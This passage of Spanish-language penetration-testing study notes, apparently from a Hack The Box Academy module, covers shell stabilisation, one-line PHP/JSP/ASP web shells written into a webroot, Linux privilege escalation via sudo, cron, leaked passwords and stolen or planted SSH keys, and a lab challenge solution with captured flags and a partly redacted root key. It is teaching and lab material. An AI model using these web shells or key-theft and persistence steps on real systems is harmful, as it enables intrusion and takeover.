Después de ejecutar este comando, presionaremos `ctrl+z` para poner en segundo plano nuestro shell y volver a nuestro terminal local, e ingresar el siguiente comando stty: 

~~~
@remotehost$ ^Z

Juceco@htb[/htb]$ stty raw -echo
Juceco@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
~~~

Una vez que presionamos fg, traerá de vuelta nuestro shell netcat al primer plano. En este punto, el terminal mostrará una línea en blanco. Podemos presionar enter nuevamente para volver a nuestro shell o reinicio de entrada y presionar enter para recuperarlo. En este punto, tendríamos un shell TTY completamente funcional con historial de comandos y todo lo demás. 

Podemos notar que nuestra shell no cubre todo el terminal. Para arreglar esto, necesitamos configurar algunas variables. Podemos abrir otra ventana de terminal en nuestro sistema, maximizar las ventanas o usar cualquier tamaño que queramos, y luego ingresar los siguientes comandos para obtener nuestras variables: 

~~~
$ echo $TERM

xterm-256color
~~~

~~~
$ stty size

67 318
~~~

El primer comando nos mostró la variable `TERM`, y el segundo nos muestra los valores para `filas` y `columnas`, respectivamente. Ahora que tenemos nuestras variables, podemos volver a nuestro shell netcat y usar el siguiente comando para corregirlas: 

~~~
@remotehost$ export TERM=xterm-256color

@remotehost$ stty rows 67 columns 318
~~~

Una vez que hagamos eso, deberíamos tener un shell netcat que use todas las funciones del terminal, como una conexión SSH. 
___

### WEB SHELL

El último tipo de shell que tenemos es Web Shell. Un Web Shell suele ser un script web, es decir, `PHP` o `ASPX`, que acepta nuestro comando a través de parámetros de solicitud HTTP, como los parámetros de solicitud `GET` o `POST, ejecuta nuestro comando e imprime su salida en la página web. 


#### *ESCRIBIENDO UN WEB SHELL*

En primer lugar, debemos escribir nuestro web shell que tomaría nuestro comando a través de una solicitud GET, lo ejecutaría e imprimiría su salida. Un script de web shell suele ser de una sola línea, muy corto y se puede memorizar fácilmente. Los siguientes son algunos scripts de web shell cortos comunes para lenguajes web comunes: 

Code:`php`
~~~
<?php system($_REQUEST["cmd"]); ?>
~~~

Code:`jsp`
~~~
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
~~~

Code:`asp`
~~~
<% eval request("cmd") %>
~~~
___

### CARGANDO UN WEB SHELL

Una vez que tengamos nuestro web shell, debemos colocar nuestro script de web shell en el directorio web del host remoto (webroot) para ejecutar el script a través del navegador web. Esto puede deberse a una vulnerabilidad en una función de carga, que nos permitiría escribir uno de nuestros shells en un archivo, es decir, shell.php y cargarlo, y luego acceder a nuestro archivo cargado para ejecutar comandos.

Sin embargo, si solo tenemos la ejecución de comandos remotos a través de un exploit, podemos escribir nuestro shell directamente en webroot para acceder a él a través de la web. Entonces, el primer paso es identificar dónde está el webroot. Los siguientes son los webroots predeterminados para servidores web comunes: 

| Web Server | Default Webroot |
| -- | -- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

Podemos verificar estos directorios para ver qué webroot está en uso y luego usar echo para escribir nuestro eb shell . Por ejemplo, si estamos atacando un host Linux que ejecuta Apache, podemos escribir un shell de `PHP` con el siguiente comando: 

Code:`bash`
~~~
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
~~~
___
### ACCEDIENDO AL WEB SHELL

Una vez que escribimos nuestro web shell, podemos acceder a él a través de un navegador o usando `cURL`. Podemos visitar la página `shell.php` en el sitio web comprometido y usar `?cmd=id` para ejecutar el comando `id`: 

![http://SERVER_IP:PORT/shell.php?cmd=id](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Otra opcion es usando `cURL`
~~~
user@hostname$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Como podemos ver, podemos seguir cambiando el comando para obtener su salida. Un gran beneficio de una web shell es que evitaría cualquier restricción de firewall existente, ya que no abrirá una nueva conexión en un puerto sino que se ejecutará en el puerto web 80 o 443, o en cualquier puerto que esté usando la aplicación web. Otro gran beneficio es que si se reinicia el host comprometido, el shell web aún estaría en su lugar, y podemos acceder a él y obtener la ejecución del comando sin explotar el host remoto nuevamente.

Por otro lado, un shell web no es tan interactivo como los reverse shells y bind shell, ya que tenemos que seguir solicitando una URL diferente para ejecutar nuestros comandos. Aún así, en casos extremos, es posible codificar un script de Python para automatizar este proceso y brindarnos un shell web semi-interactivo directamente dentro de nuestra terminal. 
___

## **ESCALANDO PRIVILEGIOS**

Nuestro acceso inicial a un servidor remoto suele ser en el contexto de un usuario con privilegios bajos, lo que no nos daría acceso completo sobre la box. Para obtener acceso completo, necesitaremos encontrar una vulnerabilidad interna/local que aumente nuestros privilegios al usuario `root` en Linux o al usuario `administrador/SYSTEM` en Windows. Analicemos algunos métodos comunes para escalar nuestros privilegios. 

___

### PRIVESC CHECKISTS

Una vez que obtengamos el acceso inicial a una box, queremos enumerarlo a fondo para encontrar posibles vulnerabilidades que podamos explotar para lograr un nivel de privilegio más alto. Podemos encontrar muchas checklist y hojas de trucos en línea que tienen una colección de verificaciones que podemos ejecutar y los comandos para ejecutar estas verificaciones. Un excelente recurso es [HackTricks](https://book.hacktricks.xyz/), que tiene una excelente lista de verificación para la escalada de privilegios locales de Linux y Windows. Otro repositorio excelente es [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), que también tiene listas de verificación para Linux y Windows. Debemos comenzar a experimentar con varios comandos y técnicas y familiarizarnos con ellos para comprender múltiples debilidades que pueden conducir a escalar nuestros privilegios. 

___

### SCRIPTS DE ENUMERACION

Muchos de los comandos anteriores pueden ejecutarse automáticamente con un script para revisar el informe y buscar cualquier debilidad. Podemos ejecutar muchos scripts para enumerar automáticamente el servidor mediante la ejecución de comandos comunes que devuelvan cualquier hallazgo interesante. Algunos de los scripts de enumeración comunes de Linux incluyen [LinEnum](https://github.com/rebootuser/LinEnum.git) y [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), y para Windows incluyen [Seatbelt](https://github.com/GhostPack/Seatbelt) y [JAWS](https://github.com/411Hall/JAWS).

Otra herramienta útil que podemos usar para la enumeración de servidores es [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), ya que está bien mantenida para mantenerse actualizada e incluye secuencias de comandos para enumerar tanto Linux como Windows. 

>Nota: Estos scripts ejecutarán muchos comandos conocidos por identificar vulnerabilidades y crearán mucho "ruido" que puede activar software antivirus o software de monitoreo de seguridad que busca este tipo de eventos. Esto puede evitar que se ejecuten los scripts o incluso activar una alarma de que el sistema se ha visto comprometido. En algunos casos, es posible que queramos hacer una enumeración manual en lugar de ejecutar scripts. 

Tomemos un ejemplo de ejecución del script de Linux de `PEASS` llamado `LinPEAS`:

~~~
Juceco@htb[/htb]$ ./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
~~~

Como podemos ver, una vez que se ejecuta el script, comienza a recopilar información y mostrarla en un excelente informe. Analicemos algunas de las vulnerabilidades que debemos buscar en el resultado de estos scripts. 
___

### KERNEL EXPLOITS

Siempre que nos encontremos con un servidor que ejecuta un sistema operativo antiguo, debemos comenzar por buscar posibles vulnerabilidades del kernel que puedan existir. Supongamos que el servidor no se mantiene con las últimas actualizaciones y parches. En ese caso, es probable que sea vulnerable a vulnerabilidades específicas del kernel que se encuentran en versiones sin parches de Linux y Windows. 

Por ejemplo, el script anterior nos mostró que la versión de Linux es `3.9.0-73-genérica`. Si buscamos en Google exploits para esta versión o usamos `searchsploit`, encontraríamos un `CVE-2016-5195`, también conocido como `DirtyCow`. Podemos buscar y descargar el exploit [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) y ejecutarlo en el servidor para obtener acceso de root.

El mismo concepto también se aplica a Windows, ya que hay muchas vulnerabilidades en versiones anteriores o sin parches de Windows, con varias vulnerabilidades que se pueden usar para escalar privilegios. Debemos tener en cuenta que los exploits del kernel pueden causar inestabilidad en el sistema y debemos tener mucho cuidado antes de ejecutarlos en los sistemas de producción. Lo mejor es probarlos en un entorno de laboratorio y solo ejecutarlos en sistemas de producción con aprobación y coordinación explícitas con nuestro cliente. 
___
### SOSFTWARE VULNERABLE

Otra cosa que debemos buscar es el software instalado. Por ejemplo, podemos usar el comando `dpkg -l` en Linux o buscar en `C:\Program Files` en Windows para ver qué software está instalado en el sistema. Deberíamos buscar exploits públicos para cualquier software instalado, especialmente si hay versiones anteriores en uso que contengan vulnerabilidades sin parchear. 

___
### PRIVILEGIOS DE USUARIO

Otro aspecto crítico a tener en cuenta después de obtener acceso a un servidor son los privilegios disponibles para el usuario al que tenemos acceso. Supongamos que se nos permite ejecutar comandos específicos como root (o como otro usuario). En ese caso, es posible que podamos escalar nuestros privilegios a los usuarios root/system u obtener acceso como un usuario diferente. A continuación se presentan algunas formas comunes de explotar ciertos privilegios de usuario: 

1. sudo
2. SUID
3. Windows Token Privileges

El comando `sudo` en Linux permite que un usuario ejecute comandos como un usuario diferente. Por lo general, se usa para permitir que los usuarios con menos privilegios ejecuten comandos como root sin darles acceso al usuario root. Esto generalmente se hace porque los comandos específicos solo se pueden ejecutar como root como `tcpdump` o permitir que el usuario acceda a ciertos directorios solo de root. Podemos comprobar qué privilegios sudo tenemos con el comando `sudo -l`:

~~~
$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
~~~

El resultado anterior dice que podemos ejecutar todos los comandos con `sudo`, lo que nos da acceso completo, y podemos usar el comando `su` con `sudo` para cambiar al usuario `root`: 

~~~
$ sudo su -

[sudo] password for user1:
whoami
root
~~~

El comando anterior requiere una contraseña para ejecutar cualquier comando con `sudo`. Hay ciertas ocasiones en las que se nos puede permitir ejecutar ciertas aplicaciones, o todas las aplicaciones, sin tener que proporcionar una contraseña: 

~~~
$ sudo -l

    (user : user) NOPASSWD: /bin/echo
~~~

La entrada `NOPASSWD` muestra que el comando `/bin/echo` se puede ejecutar sin contraseña. Esto sería útil si obtuviéramos acceso al servidor a través de una vulnerabilidad y no tuviéramos la contraseña del usuario. Como dice `user`, podemos ejecutar `sudo` como ese usuario y no como root. Para hacerlo, podemos especificar el usuario con `-u user`: 

~~~
$ sudo -u user /bin/echo Hello World!

    Hello World!
~~~

Una vez que encontramos una aplicación en particular que podemos ejecutar con `sudo`, podemos buscar formas de explotarla para obtener un shell como usuario root. [GTFOBins](https://gtfobins.github.io/) contiene una lista de comandos y cómo se pueden explotar a través de sudo. Podemos buscar la aplicación sobre la que tenemos privilegios de sudo y, si existe, puede decirnos el comando exacto que debemos ejecutar para obtener acceso de root utilizando el privilegio de sudo que tenemos. 

[LOLBAS](https://lolbas-project.github.io/#) también contiene una lista de aplicaciones de Windows que podemos aprovechar para realizar ciertas funciones, como descargar archivos o ejecutar comandos en el contexto de un usuario privilegiado. 
___

### TRAREAS PROGRAMADAS

Tanto en Linux como en Windows, existen métodos para que los scripts se ejecuten a intervalos específicos para realizar una tarea. Algunos ejemplos son la ejecución de un análisis antivirus cada hora o un script de copia de seguridad que se ejecuta cada 30 minutos. Normalmente hay dos formas de aprovechar las tareas programadas (Windows) o los trabajos cron (Linux) para escalar nuestros privilegios: 

1. Agregar nuevo scheduled tasks/cron jobs
2. Engañarlos para que ejecuten un software malicioso 

La forma más sencilla es comprobar si se nos permite añadir nuevas tareas programadas. En Linux, una forma común de mantener tareas programadas es a través de `Cron Jobs`. Hay directorios específicos que podemos utilizar para agregar nuevos trabajos cron si tenemos los permisos de escritura sobre ellos. Éstos incluyen: 


1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

Si podemos escribir en un directorio llamado por un `cron job`, podemos escribir un script bash con un comando de `reverse shell`, que debería enviarnos un `reverse shell` cuando se ejecute. 
___

### CREDENCIALES EXPUESTOS

A continuación, podemos buscar archivos que podamos leer y ver si contienen alguna credencial expuesta. Esto es muy común con archivos de configuración, archivos de registro y archivos de historial de usuario (`bash_history` en Linux y `PSReadLine` en Windows). Los scripts de enumeración que discutimos al principio generalmente buscan posibles contraseñas en los archivos y nos las proporcionan, como se muestra a continuación: 

~~~
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
~~~

Como podemos ver, se expone la contraseña de la base de datos `password123`, lo que nos permitiría iniciar sesión en las bases de datos `mysql` locales y buscar información interesante. También podemos verificar `password reuse`, ya que el usuario del sistema puede haber usado su contraseña para las bases de datos, lo que puede permitirnos usar la misma contraseña para cambiar a ese usuario, de la siguiente manera:

~~~
$ su -

Password: password123
whoami

root
~~~

También podemos usar las credenciales de usuario `ssh` para acceder al servidor como ese usuario. 

___
### SSH KEYS

Finalmente, analicemos las claves SSH. Si tenemos acceso de lectura sobre el directorio `.ssh` para un usuario específico, podemos leer sus claves ssh privadas que se encuentran en `/home/user/.ssh/id_rsa` o `/root/.ssh/id_rsa`, y usarlas para iniciar sesión en el servidor. Si podemos leer el directorio `/root/.ssh/` y podemos leer el archivo `id_rsa`, podemos copiarlo en nuestra máquina y usar el indicador `-i` para iniciar sesión con él: 

~~~
Juceco@htb[/htb]$ vim id_rsa
Juceco@htb[/htb]$ chmod 600 id_rsa
Juceco@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
~~~

>Tenga en cuenta que usamos el comando `chmod 600 id_rsa` en la clave después de crearla en nuestra máquina para cambiar los permisos del archivo para que sea más restrictivo. Si las claves ssh tienen permisos laxos, es decir, tal vez leídas por otras personas, el servidor ssh evitaría que funcionen. 

Si nos encontramos con acceso de escritura a un directorio `users/.ssh/`, podemos colocar nuestra clave pública en el directorio ssh del usuario en `/home/user/.ssh/authorized_keys`. Esta técnica generalmente se usa para obtener acceso `ssh` después de obtener un shell como ese usuario. La configuración actual de SSH no aceptará claves escritas por otros usuarios, por lo que solo funcionará si ya tenemos control sobre ese usuario. Primero debemos crear una nueva clave con `ssh-keygen` y el indicador `-f` para especificar el archivo de salida: 

~~~
$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
~~~

Esto nos dará dos archivos: `key` (que usaremos con `ssh -i`) y `key.pub`, que copiaremos a la máquina remota. Copiemos `key.pub`, luego en la máquina remota, lo agregaremos a `/root/.ssh/authorized_keys`:

~~~
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
~~~

Ahora, el servidor remoto debería permitirnos iniciar sesión como ese usuario usando nuestra clave privada: 

~~~
Juceco@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
~~~

Como podemos ver, ahora podemos entrar como usuario root. Los módulos [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51) y [the Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) brindan más detalles sobre cómo usar cada uno de estos métodos para la Escalada de privilegios, y muchos otros también. 

___
### RETO
+ SSH en el servidor anterior con las credenciales proporcionadas y use '-p xxxxxx' para especificar el puerto que se muestra arriba. Una vez que inicie sesión, intente encontrar una manera de moverse a 'usuario2', para obtener la bandera en '/home/user2/flag.txt' 

+ Una vez que obtenga acceso a 'usuario2', intente encontrar una manera de escalar sus privilegios a la raíz, para obtener el indicador en '/root/flag.txt'. 

~~~
$ ssh user1@139.59.176.69 -p31157

The authenticity of host '[138.68.180.98]:32305 ([138.68.180.98]:32305)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[138.68.180.98]:32305' (ED25519) to the list of known hosts.
(user1@138.68.180.98) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user1@gettingstartedprivesc-423812-646697d759-wtj9q:~$
~~~

~~~
user1@gettingstartedprivesc-423812-646697d759-wtj9q:~$ sudo -l
Matching Defaults entries for user1 on
    gettingstartedprivesc-423812-646697d759-wtj9q:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        gettingstartedprivesc-423812-646697d759-wtj9q:
    (user2 : user2) NOPASSWD: /bin/bash
~~~

~~~
user1@gettingstartedprivesc-423812-646697d759-wtj9q:~$ sudo -u user2 /bin/bash

user2@gettingstartedprivesc-423812-646697d759-wtj9q:/home$ cd user2
user2@gettingstartedprivesc-423812-646697d759-wtj9q:~$ cat /home/user2/flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
~~~

para la segunda pregunta debemos descargar el [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest) y correrlo para enumerar las vulnerabilidades por supuesto lo que debemos hacer es crear un archivo con `vim` donde copiaremos todo lo que esta en el archivo descargado de `linpeas`

~~~
user1@gettingstartedprivesc-423812-646697d759-7dtnj:~$ vim linpeas.sh
user1@gettingstartedprivesc-423812-646697d759-7dtnj:~$ sudo -u user2 /bin/bash
user2@gettingstartedprivesc-423812-646697d759-7dtnj:/home/user1$ /bin/bash ./linpeas.sh
~~~

recordemos que lo unico que puede hacer user2 es ejecutar archivos con bash ejecutamos el linpeas.sh con el comando `/bin/bash ./linpeas.sh`

~~~
...SNIP...
╔══════════╣ Analyzing SSH Files (limit 70)                                       
                                                                                  
-rw-r--r-- 1 root root 2602 Feb 12  2021 /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
... SNIP ...
7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----
-rw-r--r-- 1 root root 571 Feb 12  2021 /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3edfnsHVnadIdj5pqPiUq32XJ4tU2IWHtfS9CKzGg+/0GM2mlDFU+1Dxyy8er8Zq2BKjyhXKyRkhFtZvtC8JAjsmxP4+viJ5BrI0igObr6L0XWFfIxzRWwCo
... SNIP ...
/vBiBhenYaGP4bA9yPYiLh+rKdEU/V+zLrOhKM30L3vuEKHklK1Pop/Qh0zrwFwc= root@76d91fe5c270
...SNIP...
~~~

De toda la informacion y vulnerabilidades tomaremos en cuenta la de la conexion SSH porque nos permitira logearnos como root, tenemos en este caso la llave privada lo unico que tenemos que hacer es copiar ese codigo en un archivo de nombre id_rsa, por supuesto esto lo tenemos que hacer desde nuestra pc, para luego volver a ingresar

~~~
┌──(kali㉿kali)-[/home/kali]
└─$ vim id_rsa
~~~

tiene que ir toda la informacion incluso ` -----BEGIN OPENSSH PRIVATE KEY-----` y ` -----END OPENSSH PRIVATE KEY----- `

ahora ingresaremos con esta llave de la siguiente forma

~~~
                                                                             
┌──(kali㉿kali)-[/home/kali]
└─$ ssh root@139.59.176.69 -p31157 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@gettingstartedprivesc-423812-646697d759-k8xqr:~# ls
flag.txt
root@gettingstartedprivesc-423812-646697d759-k8xqr:~# cat flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
~~~



